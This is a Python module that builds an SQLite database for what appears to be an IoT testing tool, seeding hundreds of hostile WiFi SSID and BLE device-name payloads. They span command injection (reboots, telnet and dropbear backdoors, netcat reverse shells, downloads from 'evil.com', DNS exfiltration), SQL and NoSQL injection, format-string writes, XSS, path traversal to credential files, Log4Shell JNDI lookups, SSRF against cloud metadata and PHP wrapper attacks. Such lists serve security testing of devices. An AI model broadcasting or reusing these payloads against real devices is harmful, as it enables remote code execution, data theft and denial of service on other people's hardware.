import sqlite3
from pathlib import Path

DB_PATH = Path(__file__).resolve().parent / "ciw.db"

SCHEMA_SQL = """
CREATE TABLE IF NOT EXISTS payloads (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    text        TEXT NOT NULL,
    category    TEXT NOT NULL DEFAULT 'custom',
    description TEXT NOT NULL DEFAULT '',
    protocols   TEXT NOT NULL DEFAULT 'wifi',
    created_at  TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_payloads_category ON payloads(category);

CREATE TABLE IF NOT EXISTS results (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    payload_id  INTEGER NOT NULL REFERENCES payloads(id) ON DELETE CASCADE,
    device_name TEXT NOT NULL,
    device_mac  TEXT NOT NULL DEFAULT '',
    status      TEXT NOT NULL,
    notes       TEXT NOT NULL DEFAULT '',
    tested_at   TEXT NOT NULL DEFAULT (datetime('now'))
);

CREATE INDEX IF NOT EXISTS idx_results_device ON results(device_name);
CREATE INDEX IF NOT EXISTS idx_results_payload ON results(payload_id);

CREATE TABLE IF NOT EXISTS serial_log (
    id          INTEGER PRIMARY KEY AUTOINCREMENT,
    line        TEXT NOT NULL,
    received_at TEXT NOT NULL DEFAULT (datetime('now'))
);
"""

# WiFi SSID payloads. IEEE 802.11 caps SSID at 32 octets, WiFi.softAP() truncates.
DEFAULT_PAYLOADS = [
    # command injection, SSID reaching a shell sink
    ('|reboot|',             'wifi_cmd',  'Pipe operator reboot'),
    ('&reboot&',             'wifi_cmd',  'Ampersand command chain'),
    ('`reboot`',             'wifi_cmd',  'Backtick command substitution'),
    ('$reboot$',             'wifi_cmd',  'Dollar-sign variable expansion'),
    (';reboot;',             'wifi_cmd',  'Semicolon command separator'),
    ('$(reboot)',            'wifi_cmd',  'Subshell command substitution'),
    ('|shutdown -r|',        'wifi_cmd',  'Pipe with shutdown'),
    ('&cat /etc/passwd',     'wifi_cmd',  'Ampersand passwd read'),
    ('reboot\nreboot',      'wifi_cmd',  'Newline command injection'),
    ('reboot\r\nreboot',    'wifi_cmd',  'CRLF command injection'),
    ('|../../bin/sh|',       'wifi_cmd',  'Path traversal to shell'),
    ('${IFS}reboot',         'wifi_cmd',  'IFS variable separator'),
    ('*;reboot',             'wifi_cmd',  'Glob with command chain'),
    ('$(echo reboot|sh)',    'wifi_cmd',  'Echo piped to shell'),
    ('reboot\x00ignored',   'wifi_cmd',  'Null byte truncation'),
    ('|nc -lp 4444 -e sh|', 'wifi_cmd',  'Netcat reverse shell via pipe'),
    ('&wget evil.com/x&',   'wifi_cmd',  'Download + execute via ampersand'),
    ('$(curl evil.com)',     'wifi_cmd',  'Curl fetch via subshell'),
    ('|id>/tmp/pwn|',        'wifi_cmd',  'Write id output to file'),
    ('\x00|reboot|',         'wifi_cmd',  'Null-prefix command injection'),
    ('& ping -n 3 127.0.0.1 &',      'wifi_cmd',  'Windows cmd ping injection'),
    ('|powershell -c reboot|',        'wifi_cmd',  'PowerShell command via pipe'),
    ('`busybox reboot`',              'wifi_cmd',  'BusyBox-specific reboot'),
    ('$(kill -9 1)',                   'wifi_cmd',  'Kill init process (PID 1)'),
    ('|/bin/busybox telnetd|',        'wifi_cmd',  'BusyBox telnet backdoor'),
    (';id;',                           'wifi_cmd',  'Semicolon id probe'),
    ('|uname -a|',                     'wifi_cmd',  'Pipe uname fingerprint'),
    ('$(sleep 5)',                     'wifi_cmd',  'Blind time-based subshell'),
    ('&&sleep 5&&',                    'wifi_cmd',  'AND-chained time delay'),
    ('$(nslookup evil.com)',           'wifi_cmd',  'Blind DNS exfil subshell'),
    ('`id|nc evil 53`',                'wifi_cmd',  'Out-of-band id over port 53'),
    ('||telnetd -l/bin/sh',            'wifi_cmd',  'OR-chained telnet shell'),
    ('$(mkfifo /tmp/p)',               'wifi_cmd',  'Named-pipe shell primitive'),
    (';dropbear -p2222;',              'wifi_cmd',  'Dropbear SSH backdoor'),
    ('|sh -i|',                        'wifi_cmd',  'Interactive shell via pipe'),
    ('$(id;id)',                       'wifi_cmd',  'Stacked subshell commands'),
    ("';reboot;'",                     'wifi_cmd',  'Quote break then reboot'),
    ('\n$(reboot)\n',                 'wifi_cmd',  'Newline-wrapped subshell'),

    # SQLite injection, scanned SSIDs stored in a scan database
    ("' OR '1'='1",                    'wifi_sqli',  'Classic OR tautology'),
    ("' OR 1=1--",                     'wifi_sqli',  'Comment-terminated tautology'),
    ('") OR ("1"="1',                  'wifi_sqli',  'Paren-quote breakout'),
    ("admin'--",                       'wifi_sqli',  'Auth bypass comment'),
    ("' UNION SELECT 1,2--",           'wifi_sqli',  'UNION column probe'),
    ("1' AND 1=1--",                   'wifi_sqli',  'Boolean AND test'),
    ("' OR hex(1)--",                  'wifi_sqli',  'SQLite hex() call'),
    ("'||'a'='a",                      'wifi_sqli',  'Concat operator tautology'),
    ("');DROP TABLE t;--",             'wifi_sqli',  'Stacked drop statement'),
    ("' OR randomblob(9)--",           'wifi_sqli',  'SQLite randomblob load'),
    ("' OR sqlite_version()>'",        'wifi_sqli',  'Version function leak'),
    ("x' AND 1=0 UNION--",             'wifi_sqli',  'False-base UNION prefix'),

    # format string, SSID reaching a printf-family sink
    ('%s%s%s%s%s',           'wifi_fmt',  'String format crash'),
    ('%n%n%n%n',             'wifi_fmt',  'Write format exploit'),
    ('%x%x%x%x',            'wifi_fmt',  'Hex format stack leak'),
    ('%p%p%p%p',             'wifi_fmt',  'Pointer format stack leak'),
    ('%d%d%d%d%d%d',         'wifi_fmt',  'Integer format stack read'),
    ('AAAA%08x%08x%08x',    'wifi_fmt',  'Stack canary probe'),
    ('%s' * 10,              'wifi_fmt',  'Deep string deref crash'),
    ('%x' * 16,              'wifi_fmt',  'Format + overflow hybrid'),
    ('%08x.' * 4,            'wifi_fmt',  'Padded hex stack walk'),
    ('%n' * 8,               'wifi_fmt',  'Multiple write exploit'),
    ('%hn%hn%hn%hn',         'wifi_fmt',  'Short write exploit'),
    ('%1$s%2$s%3$s',         'wifi_fmt',  'Positional parameter access'),
    ('%1$n%2$n',             'wifi_fmt',  'Positional write exploit'),
    ('%.9999d',              'wifi_fmt',  'Width overflow DoS'),
    ('%c' * 16,              'wifi_fmt',  'Char format stack dump'),
    ('%7$x',                 'wifi_fmt',  'Direct 7th-arg leak'),
    ('%7$n',                 'wifi_fmt',  'Direct 7th-arg write'),
    ('%10$p',                'wifi_fmt',  'Positional pointer leak'),
    ('%99999999d',           'wifi_fmt',  'Large width allocation DoS'),
    ('%s%n%s%n',             'wifi_fmt',  'Mixed read/write chain'),
    ('%*d%*d',               'wifi_fmt',  'Indirect width consumption'),
    ('AAAA%7$n',             'wifi_fmt',  'Targeted write at offset'),

    # overflow / boundary fill at the 32-byte SSID limit
    ('A' * 32,               'wifi_overflow',  '32-byte max SSID fill'),
    ('A' * 31 + '\x00',     'wifi_overflow',  'Null-terminated at boundary'),
    ('\x7f' * 32,            'wifi_overflow',  '0x7F DEL fill (32B)'),
    ('\x00' * 32,            'wifi_overflow',  'All null bytes'),
    ('A' * 16 + '\x00' * 16, 'wifi_overflow', 'Half-null padding'),
    ('A' * 30 + '\r\n',     'wifi_overflow',  'CRLF at boundary'),
    ('B' * 31 + '\x0a',     'wifi_overflow',  '0x42 fill + trailing LF'),
    ('\x7e\x7f' * 16,        'wifi_overflow',  'Tilde+DEL alternating (32B)'),
    ('\x01' * 32,            'wifi_overflow',  'SOH control byte fill (32B)'),
    ('A' * 31 + '\x7f',     'wifi_overflow',  'DEL char at boundary'),
    ('A' * 24 + '\x00' * 8,  'wifi_overflow', 'ASCII head + null tail'),
    ('\x02' * 32,            'wifi_overflow',  'STX control byte fill (32B)'),
    ('\x1f' * 32,            'wifi_overflow',  'Unit-sep byte fill (32B)'),
    ('\x7f' * 16 + '\x00' * 16, 'wifi_overflow', 'DEL head + null tail'),
    ('\x08' * 32,            'wifi_overflow',  'Backspace byte fill (32B)'),
    ('Z' * 1,                'wifi_overflow',  'Single-char min length'),

    # probe / malformed 802.11 SSID edge cases
    ('',                     'wifi_probe',  'Empty SSID (hidden network)'),
    (' ',                    'wifi_probe',  'Single space SSID'),
    ('\x00' * 1,             'wifi_probe',  'Single null byte SSID'),
    ('\x03' * 32,            'wifi_probe',  'ETX control char fill'),
    ('\t\n\r' * 10,          'wifi_probe',  'Whitespace control chars'),
    ('​' * 10,         'wifi_probe',  'Zero-width spaces (Unicode)'),
    ('A' * 30 + '\xff',     'wifi_probe',  'Trailing invalid byte'),
    ('\x00HIDDEN\x00NET',   'wifi_probe',  'Null-embedded SSID'),
    ('\xef\xbb\xbfSSID',    'wifi_probe',  'UTF-8 BOM prefix'),
    ('\\\\\\\\\\\\\\\\',    'wifi_probe',  'Escape sequence flood'),
    ('‮diSS_derewop',            'wifi_probe',  'RTL override display spoof'),
    ('DIRECT-xy-FAKEDEVICE',          'wifi_probe',  'WiFi Direct prefix spoof'),
    ('\xc0\x80' * 8,                  'wifi_probe',  'Overlong null encoding (x8)'),
    ('\xed\xa0\x80' * 5,              'wifi_probe',  'Lone surrogate bytes (x5)'),
    ('\U0001F4A9' * 6,               'wifi_probe',  'Emoji fill (4-byte UTF-8)'),
    ('\x7f' * 1,                      'wifi_probe',  'Single DEL byte SSID'),
    ('ESP_' + '\xff' * 4,             'wifi_probe',  'Vendor prefix + invalid tail'),
    (' ' * 16,                  'wifi_probe',  'Non-breaking space fill'),

    # terminal escape, SSID echoed to a serial/syslog viewer
    ('\x1b[2J\x1b[HPWNED',          'wifi_esc',  'Clear screen + cursor home'),
    ('\x1b]2;HACKED\x07',           'wifi_esc',  'Set terminal title via OSC'),
    ('\x1b[6n',                      'wifi_esc',  'Cursor position report inject'),
    ('\x1b[?1049h',                  'wifi_esc',  'Switch to alt screen buffer'),
    ('\x1b[31mCRITICAL\x1b[0m',     'wifi_esc',  'Colored fake log entry'),
    ('\r\x1b[K[OK] All normal',     'wifi_esc',  'Overwrite log line'),
    ('\n[root] shutdown -h now\n',   'wifi_esc',  'Fake root log line'),
    ('\x1b[8mHIDDEN_PAYLOAD',        'wifi_esc',  'Conceal mode (invisible)'),
    ('\x1bc',                        'wifi_esc',  'RIS full terminal reset'),
    ('\x1b]52;c;cHdu\x07',          'wifi_esc',  'OSC 52 clipboard write'),
    ('\x1b[3J',                      'wifi_esc',  'Clear scrollback buffer'),
    ('\x1bPtmux;\x1b\x1b[31m',      'wifi_esc',  'tmux passthrough sequence'),

    # serialization / config injection, SSID stored in JSON/XML/INI
    ('","cmd":"reboot"}',            'wifi_serial',  'JSON key close + inject'),
    ('</n><cmd>reboot</cmd>',        'wifi_serial',  'XML tag escape + inject'),
    ("'; DROP TABLE wifi;--",        'wifi_serial',  'SQLite inject via storage'),
    ('\\",\\"admin\\":true,\\"x\\":\\"', 'wifi_serial', 'JSON privilege escalation'),
    ('key=val\nroot=true',           'wifi_serial',  'INI/env newline injection'),
    ('{{reboot}}',                   'wifi_serial',  'Jinja/Mustache template'),
    ('#{system("reboot")}',          'wifi_serial',  'ERB/Ruby template'),
    ('${7*7}',                       'wifi_serial',  'SSTI expression eval'),
    ('=CMD("reboot")',                'wifi_serial',  'Excel formula injection'),
    ('-cmd|\'/C calc\'!A0',           'wifi_serial',  'DDE minus prefix exec'),
    ('+cmd|\'/C calc\'!A0',           'wifi_serial',  'DDE plus prefix exec'),
    ('!!python/object/apply:os.system ["reboot"]'[:32],
                                      'wifi_serial',  'YAML deserialization RCE'),
    ('O:8:"Obj":1:{s:1:"x";}',       'wifi_serial',  'PHP object deserialization'),
    ('@reboot',                       'wifi_serial',  'Crontab line injection'),
    ('*/1 * * * * id',                'wifi_serial',  'Cron schedule injection'),
    ('<!ENTITY x SYSTEM "file">',     'wifi_serial',  'XXE entity declaration'),
    ('${__import__("os")}',           'wifi_serial',  'Python SSTI import'),

    # encoding / normalization, Unicode or percent-encoding folds to metachars
    ('＄(reboot)',               'wifi_enc',  'Fullwidth $ normalization'),
    ('｜reboot｜',           'wifi_enc',  'Fullwidth | normalization'),
    ('；reboot；',           'wifi_enc',  'Fullwidth ; normalization'),
    ('%7Creboot%7C',                 'wifi_enc',  'URL-encoded pipe'),
    ('%24(reboot)',                   'wifi_enc',  'URL-encoded $ subshell'),
    ('\\u0060reboot\\u0060',         'wifi_enc',  'JSON Unicode backtick'),
    ('&#124;reboot&#124;',           'wifi_enc',  'HTML entity pipe'),
    ('\xc0\xafreboot',               'wifi_enc',  'Overlong UTF-8 slash'),
    ('%60reboot%60',                 'wifi_enc',  'URL-encoded backtick'),
    ('%0areboot',                     'wifi_enc',  'URL-encoded newline'),
    ('+ADw-script+AD4-',             'wifi_enc',  'UTF-7 XSS encoding'),
    (';reboot',                  'wifi_enc',  'Greek question mark as ;'),
    ('＆＆reboot',           'wifi_enc',  'Fullwidth && normalization'),
    ('%2524(reboot)',                 'wifi_enc',  'Double URL-encoded $'),

    # byte-pattern fuzz, repeating 32-byte markers for crash triage
    ('\x41' * 4 + '\x7f' * 4 + '\x41' * 4 + '\x7f' * 4 + '\x41' * 4 + '\x7f' * 4 + '\x41' * 4 + '\x7f' * 4,
                                     'wifi_fuzz',  'High/low byte alternating (32B)'),
    ('\x00\x00\x00\x04' * 8,        'wifi_fuzz',  'Repeating small-int (32B)'),
    ('DEADBEEF' * 4,                 'wifi_fuzz',  'DEADBEEF marker (32B)'),
    ('\x01\x00\x00\x00' * 8,        'wifi_fuzz',  'Repeating int-1 (32B)'),
    ('\x01\x01\x01\x7f' * 8,        'wifi_fuzz',  'Near-max-byte pattern (32B)'),
    ('\x00' * 28 + '\x41\x41\x41\x41', 'wifi_fuzz', 'Null-sled + ASCII tail (32B)'),
    ('BAADF00D' * 4,                 'wifi_fuzz',  'BAADF00D debug marker (32B)'),
    ('\x41\x41\x41\x41' * 7 + '\x7e\x7f\x7e\x7f',
                                     'wifi_fuzz',  'ASCII + boundary byte (32B)'),
    ('CAFEBABE' * 4,                 'wifi_fuzz',  'CAFEBABE marker (32B)'),
    ('\x10\x20\x30\x40' * 8,        'wifi_fuzz',  'Ascending byte ramp (32B)'),
    ('FEEDFACE' * 4,                 'wifi_fuzz',  'FEEDFACE marker (32B)'),
    ('\x7f\x00' * 16,                'wifi_fuzz',  'DEL/null alternating (32B)'),

    # XSS, IoT dashboards render scanned SSIDs unsanitized
    ('<script>alert(1)</script>',     'wifi_xss',  'Basic reflected XSS'),
    ('<img src=x onerror=alert(1)>',  'wifi_xss',  'Event handler XSS'),
    ('"><svg onload=alert(1)>',       'wifi_xss',  'Attribute breakout SVG'),
    ('<body onload=alert(1)>',        'wifi_xss',  'Body tag event injection'),
    ('<details open ontoggle=a()>',   'wifi_xss',  'details ontoggle event'),
    ('<iframe src=//evil.com>',       'wifi_xss',  'iFrame injection'),
    ("'-alert(1)-'",                  'wifi_xss',  'JS string breakout'),
    ('<marquee onstart=alert(1)>',    'wifi_xss',  'Marquee event handler'),
    ('<svg/onload=alert(1)>',         'wifi_xss',  'Slash-separated SVG XSS'),
    ('<a href=javascript:a()>x',      'wifi_xss',  'javascript: URI handler'),
    ('<input autofocus onfocus=a()>', 'wifi_xss',  'Autofocus onfocus event'),
    ('<video><source onerror=a()>',   'wifi_xss',  'Video source onerror'),
    ('</script><script>a()',          'wifi_xss',  'Script context breakout'),
    ('"onmouseover="a()',             'wifi_xss',  'Attribute event breakout'),
    ('<svg><animate onbegin=a()>',    'wifi_xss',  'SVG animate onbegin'),
    ('{{constructor.constructor}}',   'wifi_xss',  'Angular sandbox probe'),

    # path traversal, SSID placed into a filesystem path
    ('../../../etc/shadow',           'wifi_path',  'Shadow file traversal'),
    ('....//....//etc/passwd',        'wifi_path',  'Double-dot filter bypass'),
    ('..%2f..%2f..%2fetc/pass',      'wifi_path',  'URL-encoded slash traversal'),
    ('/proc/self/environ',            'wifi_path',  'Process environment leak'),
    ('../..\\..\\..\\boot.ini',      'wifi_path',  'Mixed separator traversal'),
    ('/dev/urandom',                  'wifi_path',  'Device file read DoS'),
    ('..%252f..%252fetc/x',          'wifi_path',  'Double-encoded traversal'),
    ('/proc/self/cmdline',            'wifi_path',  'Process cmdline leak'),
    ('..%c0%afetc/passwd',           'wifi_path',  'Overlong-slash traversal'),
    ('/sys/class/net/',               'wifi_path',  'Sysfs network enum'),
    ('....\\\\....\\\\winini',        'wifi_path',  'Windows double-dot bypass'),
    ('/proc/1/maps',                  'wifi_path',  'PID 1 memory map leak'),

    # CRLF / HTTP header injection, SSID reflected into a response
    ('\r\nX-Injected: true',          'wifi_crlf',  'Custom header injection'),
    ('%0d%0aSet-Cookie:a=1',          'wifi_crlf',  'URL-encoded cookie inject'),
    ('\r\nLocation: //evil',          'wifi_crlf',  'Redirect header injection'),
    ('%0d%0a%0d%0a<h1>XSS',          'wifi_crlf',  'Response splitting body'),
    ('\nTransfer-Encoding: z',        'wifi_crlf',  'Request smuggling prefix'),
    ('\r\nContent-Length: 0',         'wifi_crlf',  'Content-Length inject'),
    ('%0d%0aRefresh:0;url=//e',      'wifi_crlf',  'Refresh redirect inject'),
    ('\r\nSet-Cookie: s=1;HttpOnly',  'wifi_crlf',  'Session fixation cookie'),
    ('%E5%98%8A%E5%98%8Ax:1',        'wifi_crlf',  'Unicode CRLF bypass'),
    ('\r\n\r\n<svg onload=a()>',      'wifi_crlf',  'Header-body split XSS'),

    # JNDI / expression language, Java loggers ingesting SSIDs
    ('${jndi:ldap://evil/a}',         'wifi_jndi',  'Log4Shell JNDI LDAP'),
    ('${jndi:dns://evil/a}',          'wifi_jndi',  'JNDI DNS exfiltration'),
    ('${env:AWS_SECRET_KEY}',         'wifi_jndi',  'Env variable leak via EL'),
    ('${sys:user.dir}',               'wifi_jndi',  'System property leak'),
    ('${jndi:rmi://evil/a}',          'wifi_jndi',  'JNDI RMI class loading'),
    ('${{<%[%\'"}}%\\.',              'wifi_jndi',  'Polyglot template probe'),
    ('${jndi:ldap://${hostName}}',    'wifi_jndi',  'Nested lookup exfil'),
    ('${lower:J}ndi:dns://e/a',       'wifi_jndi',  'Obfuscated jndi lookup'),
    ('${::-${jndi:dns://e}}',         'wifi_jndi',  'Default-value obfuscation'),
    ('%{(#a=1).(#b=@x@y)}',           'wifi_jndi',  'OGNL expression probe'),

    # NoSQL / LDAP injection, cloud-connected device auth and storage
    ('{"$gt":""}',                    'wifi_nosql',  'MongoDB gt bypass'),
    ('{"$ne":null}',                  'wifi_nosql',  'MongoDB not-equal bypass'),
    ('{"$regex":".*"}',               'wifi_nosql',  'MongoDB regex match-all'),
    ('{"$where":"1==1"}',             'wifi_nosql',  'MongoDB server-side JS'),
    ('*)(uid=*))(|(uid=*',            'wifi_nosql',  'LDAP wildcard filter'),
    ('admin)(|(password=*',           'wifi_nosql',  'LDAP password bypass'),
    ('{"$nin":[]}',                   'wifi_nosql',  'MongoDB not-in empty set'),
    ('{"$exists":true}',              'wifi_nosql',  'MongoDB field existence'),
    ('*)(objectClass=*',              'wifi_nosql',  'LDAP objectClass enum'),
    (')(cn=*))\x00',                  'wifi_nosql',  'LDAP null-byte truncation'),

    # SSRF, device fetches a URL taken from the SSID
    ('http://169.254.169.254/',       'wifi_ssrf',  'Cloud metadata endpoint'),
    ('http://127.0.0.1:80/',          'wifi_ssrf',  'Localhost service probe'),
    ('http://[::1]:80/',              'wifi_ssrf',  'IPv6 loopback probe'),
    ('file:///etc/passwd',            'wifi_ssrf',  'file:// local read'),
    ('gopher://127.0.0.1:6379/',      'wifi_ssrf',  'Gopher Redis SSRF'),
    ('dict://127.0.0.1:11211/',       'wifi_ssrf',  'Dict memcached SSRF'),
    ('http://2130706433/',            'wifi_ssrf',  'Decimal IP bypass'),
    ('http://0177.0.0.1/',            'wifi_ssrf',  'Octal IP bypass'),
    ('jar:http://evil/x!/',           'wifi_ssrf',  'Java jar: SSRF'),
    ('ftp://evil.com/x',              'wifi_ssrf',  'FTP scheme fetch'),

    # argument injection, SSID passed as a CLI option to a tool
    ('-oProxyCommand=id;',            'wifi_argv',  'SSH ProxyCommand inject'),
    ('--checkpoint-action=sh',        'wifi_argv',  'tar checkpoint exec'),
    ('-Fphar:///tmp/x',               'wifi_argv',  'PHP -F phar wrapper'),
    ('--use-askpass=/x',              'wifi_argv',  'askpass option inject'),
    ('-dauto_prepend_file',           'wifi_argv',  'PHP-CGI arg injection'),
    ('@/etc/passwd',                  'wifi_argv',  'curl @file read'),
    ('-e sh -c id',                   'wifi_argv',  'rsync -e exec'),
    ('--version;id',                  'wifi_argv',  'Option value break'),
    ('-R/tmp:/tmp',                   'wifi_argv',  'Bind-style arg inject'),

    # PHP wrappers, router UIs built on PHP
    ('php://input',                   'wifi_php',  'PHP input stream RCE'),
    ('php://filter/resource=x',       'wifi_php',  'PHP filter wrapper LFI'),
    ('data://text/plain,id',          'wifi_php',  'data:// inline code'),
    ('expect://id',                   'wifi_php',  'expect:// command run'),
    ("<?php system('id')?>",          'wifi_php',  'PHP tag injection'),
    ('<?=`id`?>',                     'wifi_php',  'Short-echo backtick'),
    ('zip://x.zip%23s',               'wifi_php',  'zip:// wrapper LFI'),
    ('phar://x.phar/s',               'wifi_php',  'phar:// deserialize'),
    ('/?-dallow_url=1',               'wifi_php',  'PHP-CGI query inject'),
]

# BLE name payloads. Complete Local Name AD field, 29-byte legacy advertising limit.
BLE_PAYLOADS = [
    # command injection
    ('|reboot|',                 'ble_cmd',      'Pipe command injection'),
    ('`reboot`',                 'ble_cmd',      'Backtick substitution'),
    ('$(reboot)',                'ble_cmd',      'Subshell substitution'),
    (';reboot;',                 'ble_cmd',      'Semicolon separator'),
    ('&reboot&',                 'ble_cmd',      'Ampersand chain'),
    ('$(busybox reboot)',        'ble_cmd',      'BusyBox subshell reboot'),
    ('|nc evil 4444 -e sh|',     'ble_cmd',      'Reverse shell via pipe'),
    (';id;',                     'ble_cmd',      'Semicolon id probe'),
    ('|uname -a|',               'ble_cmd',      'Pipe uname fingerprint'),
    ('$(sleep 5)',               'ble_cmd',      'Blind time-based subshell'),
    ('$(reboot;id)',             'ble_cmd',      'Stacked subshell commands'),
    ('|telnetd -l/bin/sh|',      'ble_cmd',      'Telnet shell via pipe'),

    # format string
    ('%s%s%s%s',                 'ble_fmt',      'String format crash'),
    ('%n%n%n%n',                 'ble_fmt',      'Write format exploit'),
    ('%x%x%x%x',                 'ble_fmt',      'Hex stack leak'),
    ('AAAA%08x%08x',             'ble_fmt',      'Stack canary probe'),
    ('%p%p%p%p',                 'ble_fmt',      'Pointer leak'),
    ('%7$n',                     'ble_fmt',      'Direct 7th-arg write'),
    ('%s%s%s%s%s%s%s',           'ble_fmt',      'Deep string deref crash'),
    ('%p%p%p%p%p%p',             'ble_fmt',      'Extended pointer leak'),

    # overflow / boundary fill at the 29-byte name limit
    ('A' * 29,                   'ble_overflow', '29-byte name fill'),
    ('A' * 28 + '\x00',          'ble_overflow', 'Null-terminated boundary'),
    ('\x7f' * 29,                'ble_overflow', 'DEL byte fill (29B)'),
    ('\x00' * 29,                'ble_overflow', 'All null bytes'),
    ('A' * 14 + '\x00' * 15,     'ble_overflow', 'Half-null padded name'),
    ('\xff' * 14,                'ble_overflow', '0xFF fill (high bit, 28B)'),
    ('\x7e' * 29,                'ble_overflow', 'Tilde fill (29B)'),
    ('\x00' * 28 + 'A',          'ble_overflow', 'Null-sled + ASCII tail'),
    ('\xfe' * 13 + '\x00',       'ble_overflow', '0xFE fill + null tail'),

    # probe / malformed
    ('\x1b]0;owned\x07',         'ble_probe',    'ANSI OSC title set'),
    ('‮diSS_derewop',       'ble_probe',    'RTL override display spoof'),
    ('\xc0\x80\xc0\x80',         'ble_probe',    'Overlong null encoding'),
    ('\r\nINJECTED\r\n',         'ble_probe',    'CRLF in name field'),
    ('\x1b[2J',                  'ble_probe',    'Clear-screen escape'),
    ('\xef\xbb\xbfBLE',          'ble_probe',    'UTF-8 BOM prefix'),
    ('​' * 9,               'ble_probe',    'Zero-width space fill'),
    ('DIRECT-x-FAKE',            'ble_probe',    'Pairing prefix spoof'),

    # XSS, BLE companion apps render the name in a webview
    ('<script>alert(1)</script>'[:29], 'ble_xss',  'Script tag in name'),
    ('<img src=x onerror=alert(1)>'[:29], 'ble_xss', 'Img onerror name'),
    ('"><svg onload=a()>',       'ble_xss',      'Attribute breakout SVG'),
    ("'-alert(1)-'",             'ble_xss',      'JS string breakout'),
    ('<b onmouseover=a()>x',     'ble_xss',      'Event handler on tag'),

    # SQLite injection, companion app stores device names
    ("' OR '1'='1",              'ble_sqli',     'Classic OR tautology'),
    ("' OR 1=1--",               'ble_sqli',     'Comment-terminated tautology'),
    ("admin'--",                 'ble_sqli',     'Auth bypass comment'),
    ("';DROP TABLE x;--",        'ble_sqli',     'Stacked drop statement'),
    ("' UNION SELECT 1--",       'ble_sqli',     'UNION column probe'),
    ("'||sqlite_version()",      'ble_sqli',     'Version function leak'),

    # serialization / template injection in the companion app
    ('","admin":true}',          'ble_serial',   'JSON key close + inject'),
    ('${7*7}',                   'ble_serial',   'SSTI expression eval'),
    ('{{7*7}}',                  'ble_serial',   'Jinja template eval'),
    ("#{system('id')}",          'ble_serial',   'ERB/Ruby template'),
    ('</x><y>z</y>',             'ble_serial',   'XML tag escape'),

    # path traversal, name used in a filesystem path
    ('../../etc/passwd',         'ble_path',     'passwd traversal'),
    ('/proc/self/environ',       'ble_path',     'Process environment leak'),
    ('..%2f..%2fetc/x',          'ble_path',     'URL-encoded traversal'),
    ('/dev/urandom',             'ble_path',     'Device file read DoS'),
    ('....//....//x',            'ble_path',     'Double-dot filter bypass'),
]


def _flatten_payloads():
    for text, category, description in DEFAULT_PAYLOADS:
        yield text, category, description, 'wifi'
    for text, category, description in BLE_PAYLOADS:
        yield text, category, description, 'ble'


def get_db() -> sqlite3.Connection:
    conn = sqlite3.connect(str(DB_PATH))
    conn.row_factory = sqlite3.Row
    conn.execute("PRAGMA journal_mode=WAL")
    conn.execute("PRAGMA foreign_keys=ON")
    return conn


def init_db():
    conn = get_db()
    conn.executescript(SCHEMA_SQL)
    conn.close()


def seed_default_payloads():
    conn = get_db()
    count = conn.execute("SELECT COUNT(*) FROM payloads").fetchone()[0]
    if count == 0:
        for text, category, description, protocols in _flatten_payloads():
            conn.execute(
                "INSERT INTO payloads (text, category, description, protocols) "
                "VALUES (?, ?, ?, ?)",
                (text, category, description, protocols),
            )
        conn.commit()
    conn.close()
